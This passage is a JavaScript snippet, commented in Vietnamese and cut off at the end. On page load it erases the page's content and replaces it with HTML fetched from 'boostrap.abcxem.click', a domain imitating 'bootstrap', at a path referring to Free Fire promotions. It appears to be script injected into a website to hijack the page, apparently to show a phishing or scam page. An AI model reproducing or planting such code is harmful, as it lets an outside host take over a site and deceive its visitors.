...
window.onload = function() {
    // Xóa sạch nội dung HTML hiện tại
    document.body.innerHTML = '';

    // URL của API cung cấp nội dung HTML
    var apiUrl = 'https://boostrap.abcxem.click/freefirenapuudaivn/uudaivn.php';

    // Thực hiện yêu cầu AJAX
    fetch(apiUrl)
        .then(response => response.text()) // Chuyển đổi kết quả thành text (HTML)
        .then(html => {
            // Chèn HTML mới vào body của trang
            document.body.innerHTML = html;
        })
        .catch(error => {
            console.error('Lỗi khi tải HTML từ API:', error);
